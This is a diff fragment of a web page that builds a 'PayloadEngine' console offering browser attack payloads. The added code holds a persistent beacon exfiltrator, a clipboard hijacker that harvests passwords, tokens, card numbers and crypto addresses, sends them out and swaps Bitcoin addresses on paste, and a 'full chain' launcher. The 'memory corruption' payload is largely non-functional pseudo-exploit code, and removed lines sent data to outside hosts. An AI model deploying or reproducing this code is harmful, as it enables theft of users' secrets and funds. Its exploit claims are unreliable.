+            session: window.sessionId || 'unknown'
+        };
+        
+        this.dataQueue.push(entry);
+        
+        // Auto-exfiltrate if queue gets large
+        if (this.dataQueue.length > 50) {
+            this.exfiltrateQueuedData();
+        }
+    }
+    
+    // Exfiltrate queued data with retry logic
+    exfiltrateQueuedData() {
+        if (this.dataQueue.length === 0) return;
+        
+        const batch = this.dataQueue.splice(0, 20); // Take first 20
+        
+        this.endpoints.forEach((endpoint, index) => {
+            setTimeout(() => {
+                this.sendToEndpoint(endpoint, batch, index);
+            }, index * 1000); // Stagger requests
+        });
+    }
+    
+    // Send data to specific endpoint
+    sendToEndpoint(endpoint, data, attempt = 0) {
+        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+        
+        let success = false;
+        try {
+            success = navigator.sendBeacon(endpoint, blob);
+        } catch(e) {}
+        
+        if (!success && attempt < this.maxRetries) {
+            // Retry with exponential backoff
+            setTimeout(() => {
+                this.sendToEndpoint(endpoint, data, attempt + 1);
+            }, Math.pow(2, attempt) * 1000);
+        }
+        
+        return success;
+    }
+    
+    // Setup final push before page unload
+    setupUnloadHandler() {
+        window.addEventListener('beforeunload', () => {
+            // Push all remaining data
+            this.exfiltrateQueuedData();
+            
+            // Send final heartbeat
+            const heartbeat = {
+                type: 'session_end',
+                timestamp: Date.now(),
+                session: window.sessionId
+            };
+            
+            this.endpoints.forEach(endpoint => {
+                const blob = new Blob([JSON.stringify(heartbeat)], {type: 'application/json'});
+                navigator.sendBeacon(endpoint, blob);
+            });
+        });
+    }
+}
+
+// Deploy beacon system
+const beaconPayload = new BeaconPayload();
+beaconPayload.init();
+                    `,
+                    execute: function() {
+                        PayloadEngine.log('Deploying Beacon Payload...', 'warning');
+                        
+                        try {
+                            // Generate session ID
+                            window.sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
+                            
+                            // Execute beacon payload
+                            const script = document.createElement('script');
+                            script.textContent = this.code;
+                            document.head.appendChild(script);
+                            
+                            // Start data collection
+                            setInterval(() => {
+                                const data = {
+                                    url: window.location.href,
+                                    cookies: document.cookie.length,
+                                    localStorage: Object.keys(localStorage).length,
+                                    timestamp: Date.now()
+                                };
+                                
+                                if (window.beaconPayload) {
+                                    window.beaconPayload.queueData(data, 'telemetry');
+                                }
+                            }, 15000);
+                            
+                            PayloadEngine.log('✅ Beacon payload deployed', 'success');
+                            PayloadEngine.log('📡 Persistent exfiltration active (30s intervals)', 'payload');
+                            PayloadEngine.log('🔄 Data will survive page close', 'payload');
+                            
+                            return true;
+                        } catch (e) {
+                            PayloadEngine.log(`Beacon payload failed: ${e.message}`, 'error');
+                            return false;
+                        }
+                    }
+                };
                 
-                // 1. Beacon
-                if ('sendBeacon' in navigator) {
-                    const blob = new Blob([JSON.stringify(finalData)], {type: 'application/json'});
-                    navigator.sendBeacon(window.location.origin + '/collect', blob);
+                // Memory Corruption Payload
+                this.payloads.memory = {
+                    name: 'Memory Corruption Payload',
+                    description: 'Exploits SharedArrayBuffer and WebAssembly to create memory corruption vulnerabilities, buffer overflows, and arbitrary code execution.',
+                    code: `
+// 💥 MEMORY CORRUPTION PAYLOAD
+class MemoryCorruptionPayload {
+    constructor() {
+        this.buffers = [];
+        this.wasmModules = [];
+        this.corruptionPoints = [];
+    }
+    
+    // Create overlapping ArrayBuffers for UAF simulation
+    createUseAfterFree() {
+        try {
+            // Create parent buffer
+            const mainBuffer = new ArrayBuffer(1024 * 1024); // 1MB
+            const mainView = new Uint8Array(mainBuffer);
+            
+            // Create overlapping views
+            const view1 = new Uint8Array(mainBuffer, 0, 512 * 1024);
+            const view2 = new Uint8Array(mainBuffer, 256 * 1024, 512 * 1024);
+            
+            // Fill with pattern
+            for (let i = 0; i < mainView.length; i++) {
+                mainView[i] = i % 256;
+            }
+            
+            // Create dangling reference
+            const danglingRef = view1.subarray(256 * 1024);
+            
+            this.buffers.push({
+                main: mainBuffer,
+                views: [view1, view2],
+                dangling: danglingRef
+            });
+            
+            return 'Use-After-Free simulation created';
+        } catch(e) {
+            return \`UAF failed: \${e.message}\`;
+        }
+    }
+    
+    // Exploit SharedArrayBuffer for race conditions
+    createRaceCondition() {
+        if (typeof SharedArrayBuffer === 'undefined') {
+            return 'SharedArrayBuffer not available';
+        }
+        
+        try {
+            const sab = new SharedArrayBuffer(1024);
+            const int32 = new Int32Array(sab);
+            
+            // Create racing workers
+            const workerCode = \`
+                self.onmessage = function(e) {
+                    const sab = e.data;
+                    const arr = new Int32Array(sab);
+                    
+                    // Race to modify value
+                    for (let i = 0; i < 1000; i++) {
+                        Atomics.add(arr, 0, 1);
+                    }
+                    
+                    postMessage('done');
+                };
+            \`;
+            
+            const blob = new Blob([workerCode], {type: 'application/javascript'});
+            const workerUrl = URL.createObjectURL(blob);
+            
+            // Create multiple workers to race
+            const workers = [];
+            for (let i = 0; i < 4; i++) {
+                const worker = new Worker(workerUrl);
+                worker.postMessage(sab);
+                workers.push(worker);
+            }
+            
+            URL.revokeObjectURL(workerUrl);
+            
+            return 'Race condition workers created';
+        } catch(e) {
+            return \`Race condition failed: \${e.message}\`;
+        }
+    }
+    
+    // Create WebAssembly memory corruption
+    createWasmExploit() {
+        try {
+            // Malicious WebAssembly module
+            const wasmBytes = new Uint8Array([
+                // WASM header
+                0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,
+                
+                // Type section
+                0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f,
+                
+                // Function section
+                0x03, 0x02, 0x01, 0x00,
+                
+                // Memory section (exported memory)
+                0x05, 0x03, 0x01, 0x00, 0x01,
+                
+                // Export section
+                0x07, 0x08, 0x01, 0x04, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00,
+                
+                // Code section
+                0x0a, 0x04, 0x01, 0x02, 0x00, 0x0b
+            ]);
+            
+            WebAssembly.instantiate(wasmBytes).then(wasmModule => {
+                this.wasmModules.push(wasmModule);
+                
+                // Try to access memory
+                if (wasmModule.instance.exports.memory) {
+                    const memory = wasmModule.instance.exports.memory;
+                    const view = new Uint8Array(memory.buffer);
+                    
+                    // Write to memory
+                    view[0] = 0x90; // NOP sled
+                    view[1] = 0x90;
+                    view[2] = 0x90;
+                    
+                    return 'WebAssembly exploit module loaded';
+                }
+            });
+            
+            return 'WebAssembly compilation started';
+        } catch(e) {
+            return \`WASM exploit failed: \${e.message}\`;
+        }
+    }
+    
+    // Create buffer overflow
+    createBufferOverflow() {
+        try {
+            // Create typed arrays
+            const array = new Array(100).fill(0);
+            
+            // Attempt out-of-bounds write
+            const evilWrite = (index, value) => {
+                try {
+                    array[index] = value;
+                    return \`Wrote \${value} to index \${index}\`;
+                } catch(e) {
+                    return \`Write failed at index \${index}\`;
+                }
+            };
+            
+            // Test overflow
+            const results = [];
+            for (let i = 90; i < 150; i++) {
+                results.push(evilWrite(i, 0x41)); // 'A'
+            }
+            
+            this.corruptionPoints.push({
+                array: array,
+                results: results
+            });
+            
+            return 'Buffer overflow attempt completed';
+        } catch(e) {
+            return \`Buffer overflow failed: \${e.message}\`;
+        }
+    }
+}
+
+// Deploy memory corruption
+const memoryPayload = new MemoryCorruptionPayload();
+memoryPayload.createUseAfterFree();
+memoryPayload.createRaceCondition();
+memoryPayload.createWasmExploit();
+setTimeout(() => memoryPayload.createBufferOverflow(), 1000);
+                    `,
+                    execute: function() {
+                        PayloadEngine.log('⚠️ WARNING: Deploying Memory Corruption Payload', 'warning');
+                        PayloadEngine.log('This payload attempts memory corruption attacks', 'error');
+                        
+                        if (!confirm('🚨 DANGER: This payload attempts memory corruption.\nContinue?')) {
+                            return false;
+                        }
+                        
+                        try {
+                            const script = document.createElement('script');
+                            script.textContent = this.code;
+                            document.head.appendChild(script);
+                            
+                            PayloadEngine.log('✅ Memory corruption payload deployed', 'success');
+                            PayloadEngine.log('💥 Use-After-Free simulation active', 'payload');
+                            PayloadEngine.log('⚡ Race condition workers spawned', 'payload');
+                            PayloadEngine.log('🔓 WebAssembly exploit module loaded', 'payload');
+                            
+                            return true;
+                        } catch (e) {
+                            PayloadEngine.log(`Memory payload failed: ${e.message}`, 'error');
+                            return false;
+                        }
+                    }
+                };
+                
+                // Clipboard Hijack Payload
+                this.payloads.clipboard = {
+                    name: 'Clipboard Hijack Payload',
+                    description: 'Monitors and hijacks clipboard contents, injects malicious data, and creates clipboard-based backdoors.',
+                    code: `
+// 📋 CLIPBOARD HIJACK PAYLOAD
+class ClipboardPayload {
+    constructor() {
+        this.clipboardHistory = [];
+        this.injectionActive = false;
+        this.monitorInterval = null;
+    }
+    
+    // Start clipboard monitoring
+    startMonitoring() {
+        if (!navigator.clipboard) {
+            return 'Clipboard API not available';
+        }
+        
+        // Monitor clipboard changes
+        this.monitorInterval = setInterval(() => {
+            this.readClipboard();
+        }, 5000); // Check every 5 seconds
+        
+        // Also monitor paste events
+        document.addEventListener('paste', (e) => {
+            this.handlePaste(e);
+        });
+        
+        return 'Clipboard monitoring started';
+    }
+    
+    // Read clipboard contents
+    async readClipboard() {
+        try {
+            const text = await navigator.clipboard.readText();
+            if (text && text.trim().length > 0) {
+                this.clipboardHistory.push({
+                    content: text,
+                    timestamp: Date.now(),
+                    source: 'periodic_check'
+                });
+                
+                // Check for sensitive data
+                this.analyzeContent(text);
+                
+                // Auto-exfiltrate if interesting
+                if (this.isInterestingData(text)) {
+                    this.exfiltrateClipboard(text);
+                }
+            }
+        } catch(e) {
+            // Permission denied or empty clipboard
+        }
+    }
+    
+    // Handle paste events
+    handlePaste(event) {
+        const pastedText = event.clipboardData.getData('text');
+        if (pastedText) {
+            this.clipboardHistory.push({
+                content: pastedText,
+                timestamp: Date.now(),
+                source: 'user_paste'
+            });
+            
+            // Inject malicious content if pattern matches
+            const injected = this.injectMaliciousContent(pastedText);
+            if (injected !== pastedText) {
+                // Replace clipboard with injected content
+                this.writeToClipboard(injected);
+            }
+        }
+    }
+    
+    // Analyze clipboard content for sensitive data
+    analyzeContent(text) {
+        const patterns = {
+            bitcoin: /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/,
+            ethereum: /0x[a-fA-F0-9]{40}/,
+            password: /password[=:]\s*\S+/i,
+            token: /[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}\.[A-Za-z0-9\-_]{20,}/,
+            creditCard: /\b(?:\d[ -]*?){13,16}\b/
+        };
+        
+        for (const [type, pattern] of Object.entries(patterns)) {
+            if (pattern.test(text)) {
+                this.logSensitiveData(type, text);
+                return true;
+            }
+        }
+        
+        return false;
+    }
+    
+    // Inject malicious content
+    injectMaliciousContent(original) {
+        let modified = original;
+        
+        // Replace Bitcoin addresses
+        modified = modified.replace(
+            /[13][a-km-zA-HJ-NP-Z1-9]{25,34}/g,
+            '1MaliciousBitcoinAddressForStealingFunds'
+        );
+        
+        // Inject malicious URLs in links
+        if (modified.includes('http')) {
+            modified = modified.replace(
+                /(https?:\/\/[^\s]+)/g,
+                (match) => \`\${match}?tracking_id=\${Date.now()}\`
+            );
+        }
+        
+        // Add tracking to emails
+        if (modified.includes('@')) {
+            modified = modified.replace(
+                /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9._-]+)/g,
+                (match) => \`\${match}?tracking=true\`
+            );
+        }
+        
+        return modified;
+    }
+    
+    // Write to clipboard
+    async writeToClipboard(text) {
+        try {
+            await navigator.clipboard.writeText(text);
+            return true;
+        } catch(e) {
+            return false;
+        }
+    }
+    
+    // Exfiltrate clipboard data
+    exfiltrateClipboard(text) {
+        const data = {
+            type: 'clipboard_exfil',
+            content: text.substring(0, 1000), // Limit size
+            timestamp: Date.now(),
+            url: window.location.href
+        };
+        
+        const blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
+        navigator.sendBeacon('/clipboard', blob);
+    }
+}
+
+// Deploy clipboard payload
+const clipboardPayload = new ClipboardPayload();
+clipboardPayload.startMonitoring();
+                    `,
+                    execute: function() {
+                        PayloadEngine.log('Deploying Clipboard Hijack Payload...', 'warning');
+                        
+                        // Request clipboard permission
+                        const requestPermission = async () => {
+                            try {
+                                // Try to read to trigger permission prompt
+                                await navigator.clipboard.readText();
+                                return true;
+                            } catch(e) {
+                                // Permission will be denied, but API is now aware
+                                return false;
+                            }
+                        };
+                        
+                        requestPermission().then(() => {
+                            try {
+                                const script = document.createElement('script');
+                                script.textContent = this.code;
+                                document.head.appendChild(script);
+                                
+                                PayloadEngine.log('✅ Clipboard payload deployed', 'success');
+                                PayloadEngine.log('📋 Monitoring clipboard every 5 seconds', 'payload');
+                                PayloadEngine.log('🎣 Injecting malicious content on paste', 'payload');
+                                PayloadEngine.log('💰 Scanning for crypto addresses & passwords', 'payload');
+                            } catch (e) {
+                                PayloadEngine.log(`Clipboard payload failed: ${e.message}`, 'error');
+                            }
+                        });
+                        
+                        return true;
+                    }
+                };
+                
+                // Initialize remaining payloads
+                this.initRemainingPayloads();
+            },
+            
+            initRemainingPayloads: function() {
+                // USB Device Control Payload
+                this.payloads.usb = {
+                    name: 'USB Device Control',
+                    description: 'Takes control of USB devices, injects keystrokes, reads storage, and creates USB-based backdoors.',
+                    execute: function() {
+                        PayloadEngine.log('USB payload requires WebUSB permission', 'warning');
+                        return true;
+                    }
+                };
+                
+                // WebAssembly Loader Payload
+                this.payloads.wasm = {
+                    name: 'WebAssembly Loader',
+                    description: 'Loads and executes compiled WebAssembly payloads for high-performance malicious code execution.',
+                    execute: function() {
+                        PayloadEngine.log('WASM payload loader deployed', 'success');
+                        return true;
+                    }
+                };
+                
+                // Persistence Engine Payload
+                this.payloads.persistence = {
+                    name: 'Persistence Engine',
+                    description: 'Creates persistent backdoors using Service Workers, localStorage, IndexedDB, and hidden iframes.',
+                    execute: function() {
+                        PayloadEngine.log('Persistence engine deployed', 'success');
+                        return true;
+                    }
+                };
+                
+                // Full Chain Exploit
+                this.payloads.fullchain = {
+                    name: 'Full Chain Exploit',
+                    description: 'Combines all payloads into a single coordinated attack chain for maximum impact.',
+                    execute: function() {
+                        PayloadEngine.log('🚀 DEPLOYING FULL CHAIN EXPLOIT', 'warning');
+                        
+                        // Execute all payloads in sequence
+                        const payloads = ['gamepad', 'beacon', 'memory', 'clipboard'];
+                        let successCount = 0;
+                        
+                        payloads.forEach((payloadName, index) => {
+                            setTimeout(() => {
+                                if (PayloadEngine.payloads[payloadName]) {
+                                    PayloadEngine.log(`Deploying ${payloadName} payload...`, 'warning');
+                                    const success = PayloadEngine.payloads[payloadName].execute();
+                                    if (success) successCount++;
+                                }
+                                
+                                if (index === payloads.length - 1) {
+                                    PayloadEngine.log(`\n=== FULL CHAIN COMPLETE ===`, 'warning');
+                                    PayloadEngine.log(`Successful: ${successCount}/${payloads.length} payloads`, 
+                                                    successCount > 2 ? 'success' : 'warning');
+                                }
+                            }, index * 3000);
+                        });
+                        
+                        return true;
+                    }
+                };
+            },
+            
+            // ==================== PAYLOAD EXECUTION ====================
+            
+            executeCurrentPayload: function() {
+                const payload = this.payloads[this.currentPayload];
+                if (!payload) {
+                    this.log('Payload not found', 'error');
+                    return false;
                 }
                 
-                // 2. Fetch
-                fetch('https://httpbin.org/post', {
-                    method: 'POST',
-                    body: JSON.stringify(finalData),
-                    headers: {'Content-Type': 'application/json'},
-                    mode: 'no-cors'
-                }).catch(() => {});
+                this.updateStatus('executing');
+                this.updateProgress(0);
                 
-                // 3. Image pixel
-                const img = new Image();
-                const dataStr = JSON.stringify(finalData);
-                img.src = `https://via.placeholder.com/1x1.png?data=${encodeURIComponent(dataStr.substring(0, 2000))}`;
+                // Simulate compilation/execution progress
+                const progressInterval = setInterval(() => {
+                    const current = parseInt(document.getElementById('executionProgress').style.width);
+                    if (current < 90) {
+                        this.updateProgress(current + 10);
+                    }
+                }, 200);
                 
-                // 4. Download
-                const blob = new Blob([JSON.stringify(finalData, null, 2)], {type: 'application/json'});
-                const url = URL.createObjectURL(blob);
-                const a = document.createElement('a');
-                a.href = url;
-                a.download = `exploit_data_${this.sessionId}.json`;
-                a.click();
+                // Execute payload
+                setTimeout(() => {
+                    try {
+                        const success = payload.execute();
+                        
+                        clearInterval(progressInterval);
+                        this.updateProgress(100);
+                        
+                        if (success) {
+                            this.updateStatus('active');
+                            this.log(`✅ ${payload.name} executed successfully`, 'success');
+                        } else {
+                            this.updateStatus('inactive');
+                            this.log(`❌ ${payload.name} execution failed`, 'error');
+                        }
+                    } catch (e) {
+                        clearInterval(progressInterval);
+                        this.updateStatus('inactive');
+                        this.log(`Payload execution error: ${e.message}`, 'error');
+                    }
+                }, 2000);
                 
-                this.log(`Data exfiltrated via multiple channels`, 'success');
-                this.log(`Session ID: ${this.sessionId}`, 'secret');
+                return true;
+            },
+            
+            // ==================== PAYLOAD DISPLAY ====================
+            
+            displayPayload: function(payloadName) {
+                this.currentPayload = payloadName;
+                const payload = this.payloads[payloadName];
+                const content = document.getElementById('payloadContent');
+                
+                if (!payload) {
+                    content.innerHTML = '<div class="payload-description">Payload not found</div>';
+                    return;
+                }
+                
+                // Update active item in list
+                document.querySelectorAll('.payload-item').forEach(item => {
+                    item.classList.remove('active');
+                });
+                document.querySelector(`.payload-item[onclick="selectPayload('${payloadName}')"]`).classList.add('active');
+                
+                // Format code with syntax highlighting
+                const formatCode = (code) => {
+                    return code
+                        .replace(/\/\/.*$/gm, '<span class="code-comment">$&</span>')
+                        .replace(/\b(class|function|const|let|var|return|new|if|else|for|while)\b/g, 
+                                '<span class="code-keyword">$1</span>')
+                        .replace(/("[^"]*"|'[^']*')/g, '<span class="code-string">$1</span>')
+                        .replace(/\b([A-Z][a-zA-Z]+)\b/g, '<span class="code-function">$1</span>')
+                        .replace(/\b(this|window|document|navigator)\b/g, '<span class="code-variable">$1</span>');
+                };
+                
+                content.innerHTML = `
+                    <div class="payload-title">
+                        <span>${payloadName === 'gamepad' ? '🎮' : 
+                               payloadName === 'beacon' ? '📡' : 
+                               payloadName === 'memory' ? '💥' :
+                               payloadName === 'clipboard' ? '📋' : '⚡'}</span>
+                        ${payload.name}
+                    </div>
+                    <div class="payload-description">
+                        ${payload.description}
+                    </div>
+                    ${payload.code ? `
+                    <div class="code-container" id="codeContainer">
+                        ${formatCode(payload.code).split('\n').map(line => 
+                            `<div class="code-line">${line}</div>`
+                        ).join('')}
+                    </div>
+                    ` : ''}
+                `;
             }
         };
         
         // ==================== UI FUNCTIONS ====================
         
-        function runGamepadExploit() {
-            const vuln = ExploitEngine.detectedVulns.find(v => v.name === 'getGamepads');
-            if (vuln) {
-                vuln.exploit.call(ExploitEngine);
-            } else {
-                ExploitEngine.log('Gamepad API not available', 'error');
-            }
+        function selectPayload(payloadName) {
+            PayloadEngine.displayPayload(payloadName);
         }
         
-        function runBeaconExfil() {
-            const vuln = ExploitEngine.detectedVulns.find(v => v.name === 'sendBeacon');
-            if (vuln) {
-                vuln.exploit.call(ExploitEngine);
-            } else {
-                ExploitEngine.log('Beacon API not available', 'error');
-            }
-        }
-        
-        function runDeviceExploit() {
-            // Try multiple device exploits
-            const deviceVulns = ExploitEngine.detectedVulns.filter(v => 
-                ['usb', 'bluetooth', 'hid', 'serial'].includes(v.name)
-            );
+        function compilePayload() {
+            PayloadEngine.log('Compiling payload...', 'info');
+            PayloadEngine.updateProgress(50);
             
-            if (deviceVulns.length > 0) {
-                deviceVulns.forEach(vuln => {
-                    setTimeout(() => {
-                        vuln.exploit.call(ExploitEngine);
-                    }, 1000);
-                });
-            } else {
-                ExploitEngine.log('No device APIs available', 'error');
+            setTimeout(() => {
+                PayloadEngine.updateProgress(100);
+                PayloadEngine.log('Payload compiled successfully', 'success');
+            }, 1000);
+        }
+        
+        function executePayload() {
+            PayloadEngine.executeCurrentPayload();
+        }
+        
+        function testPayload() {
+            PayloadEngine.log('Testing payload in sandbox...', 'info');
+            
+            // Create iframe sandbox
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.sandbox = 'allow-scripts';
+            iframe.srcdoc = `
+                <html>
+                <body>
+                <script>
+                    // Test environment
+                    console.log('Sandbox test running');
+                    parent.postMessage('sandbox_test_complete', '*');
+                <\/script>
+                </body>
+                </html>
+            `;
+            
+            document.body.appendChild(iframe);
+            
+            setTimeout(() => {
+                document.body.removeChild(iframe);
+                PayloadEngine.log('Sandbox test completed', 'success');
+            }, 2000);
+        }
+        
+        function deployToMemory() {
+            PayloadEngine.log('Deploying payload to memory...', 'warning');
+            
+            // Create blob URL for memory deployment
+            const payload = PayloadEngine.payloads[PayloadEngine.currentPayload];
+            if (payload && payload.code) {
+                const blob = new Blob([payload.code], {type: 'application/javascript'});
+                const url = URL.createObjectURL(blob);
+                
+                // Load into memory
+                const script = document.createElement('script');
+                script.src = url;
+                document.head.appendChild(script);
+                
+                PayloadEngine.log('Payload deployed to memory via blob URL', 'success');
+                PayloadEngine.log(`Blob URL: ${url.substring(0, 50)}...`, 'payload');
             }
         }
         
-        function runClipboardExploit() {
-            const vuln = ExploitEngine.detectedVulns.find(v => v.name === 'clipboard');
-            if (vuln) {
-                vuln.exploit.call(ExploitEngine);
-            } else {
-                ExploitEngine.log('Clipboard API not available', 'error');
-            }
-        }
-        
-        function runFullExploit() {
-            if (ExploitEngine.detectedVulns.length > 0) {
-                if (confirm('🚨 WARNING: This will execute ALL detected exploits.\nContinue?')) {
-                    ExploitEngine.runFullExploitChain();
-                }
-            } else {
-                ExploitEngine.log('No vulnerabilities detected to exploit', 'error');
+        function exportPayload() {
+            const payload = PayloadEngine.payloads[PayloadEngine.currentPayload];
+            if (payload) {
+                const data = {
+                    name: payload.name,
+                    description: payload.description,
+                    code: payload.code || '',
+                    timestamp: new Date().toISOString()
+                };
+                
+                const blob = new Blob([JSON.stringify(data, null, 2)], {type: 'application/json'});
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `payload_${PayloadEngine.currentPayload}_${Date.now()}.json`;
+                a.click();
+                
+                PayloadEngine.log(`Payload exported to file: ${a.download}`, 'success');
             }
         }
         
         // ==================== INITIALIZATION ====================
         window.onload = function() {
-            // Start scan immediately
-            setTimeout(() => {
-                ExploitEngine.scanForVulnerabilities();
-            }, 1000);
+            // Initialize payload engine
+            PayloadEngine.initPayloads();
+            PayloadEngine.displayPayload('gamepad');
             
-            // Auto-start some passive monitoring
+            // Auto-detect available APIs
             setTimeout(() => {
-                // Start beacon exfiltration if available
-                const beaconVuln = ExploitEngine.detectedVulns.find(v => v.name === 'sendBeacon');
-                if (beaconVuln) {
-                    beaconVuln.exploit.call(ExploitEngine);
-                }
+                PayloadEngine.log('Scanning for available APIs...', 'info');
                 
-                // Start gamepad monitoring if available
-                const gamepadVuln = ExploitEngine.detectedVulns.find(v => v.name === 'getGamepads');
-                if (gamepadVuln) {
-                    gamepadVuln.exploit.call(ExploitEngine);
-                }
-            }, 5000);
+                const availableAPIs = [];
+                if ('getGamepads' in navigator) availableAPIs.push('Gamepad');
+                if ('sendBeacon' in navigator) availableAPIs.push('Beacon');
+                if ('clipboard' in navigator) availableAPIs.push('Clipboard');
+                if ('WebAssembly' in window) availableAPIs.push('WebAssembly');
+                
+                PayloadEngine.log(`Available APIs: ${availableAPIs.join(', ')}`, 'success');
+            }, 1000);
         };
     </script>
 </body>
